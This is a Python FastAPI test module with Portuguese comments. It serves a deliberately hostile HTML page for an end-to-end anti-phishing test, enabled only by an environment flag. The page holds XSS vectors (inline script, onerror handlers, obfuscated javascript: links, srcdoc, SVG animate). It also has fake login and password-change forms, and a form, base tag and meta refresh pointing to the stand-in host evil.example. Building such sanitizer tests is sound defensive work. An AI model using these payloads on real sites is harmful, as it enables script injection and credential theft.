"""Só para testes (E2E de anti-phishing): um fragmento "malicioso" e os scripts
do teste de aprovação. Ligado apenas com `HUB_DEMO_E2E_HOSTILE=1` (compose de demonstração/testes); desligado, as
rotas nem existem (404 como qualquer seção desconhecida). Nunca ligar em produção."""

from __future__ import annotations

import os

from fastapi import FastAPI
from fastapi.responses import HTMLResponse, Response

ENV = "HUB_DEMO_E2E_HOSTILE"
APPROVED_JS = "document.documentElement.dataset.e2eApproved = 'ran';\n"
TAMPERED_JS = "document.documentElement.dataset.e2eTampered = 'ran'; /* alterado depois da revisão */\n"

HOSTILE_HTML = """<div class="workspace workspace-no-sidebar" id="workspace"><section class="workspace-content" data-e2e-hostile="">
<h1>Tela de teste (hostil)</h1>
<script>window.__pwned = 'script';</script>
<img id="e2e-img" src="/nao-existe.png" onerror="window.__pwned='onerror'" alt="">
<a id="e2e-js-link" href="javascript:window.__pwned='jslink'">link javascript</a>
<a id="e2e-js-link2" href="  JaVaScRiPt&colon;window.__pwned='jslink2'">link javascript ofuscado</a>
<div id="e2e-click" onclick="window.__pwned='onclick'">clique</div>
<form id="e2e-steal" method="post" action="/login"><input name="email" value="vitima@example.com"><input name="password" type="password" value="segredo"><button id="e2e-steal-btn" type="submit">Entrar</button></form>
<form id="e2e-steal-account" method="post" action="/account/password"><input name="current" value="x"><button id="e2e-steal-account-btn" type="submit">Trocar senha</button></form>
<form id="e2e-own" method="post" action="/apps/@ID@/e2e-hostil"><button id="e2e-oauth-btn" type="submit" formaction="/oauth/authorize">Autorizar</button></form>
<form id="e2e-external" method="post" action="https://evil.example/coleta"><button id="e2e-external-btn" type="submit">Enviar</button></form>
<iframe id="e2e-iframe" srcdoc="&lt;script&gt;parent.__pwned='srcdoc'&lt;/script&gt;"></iframe>
<base href="https://evil.example/">
<meta http-equiv="refresh" content="0;url=https://evil.example/">
<object id="e2e-object" data="javascript:window.__pwned='object'"></object>
<svg id="e2e-svg"><a href="javascript:window.__pwned='svg'"><text y="20">svg</text></a><animate attributeName="href" to="javascript:alert(1)"/><set attributeName="onload" to="window.__pwned='set'"/></svg>
<img id="currentScript" name="currentScript" src="/x.png" alt="">
<div id="app-root">clobber</div>
<template id="e2e-tpl"><img src="x" onerror="window.__pwned='template'"></template>
<style>.platform-header{display:none!important}</style>
<link rel="stylesheet" href="https://evil.example/x.css">
<p data-e2e-ok="">conteúdo legítimo continua</p>
</section></div>"""


def enabled() -> bool:
    return os.environ.get(ENV) == "1"


def install(app: FastAPI, app_id: str) -> None:
    """Registra as rotas de teste de `app_id` (chamar antes das rotas genéricas `/{id}/{section}`)."""
    if not enabled():
        return
    page = HOSTILE_HTML.replace("@ID@", app_id)

    def js(body: str) -> Response:
        return Response(
            body, media_type="text/javascript; charset=utf-8", headers={"cache-control": "no-cache"}
        )

    @app.get(f"/{app_id}/e2e-hostil", include_in_schema=False)
    async def hostile_get() -> Response:
        return HTMLResponse(page)

    @app.post(f"/{app_id}/e2e-hostil", include_in_schema=False)
    async def hostile_post() -> Response:
        return HTMLResponse('<p data-e2e-posted-own="">enviado ao próprio app</p>')

    @app.get(f"/{app_id}/assets/e2e-approved.js", include_in_schema=False)
    async def approved() -> Response:
        return js(APPROVED_JS)

    @app.get(f"/{app_id}/assets/e2e-tampered.js", include_in_schema=False)
    async def tampered() -> Response:
        return js(TAMPERED_JS)
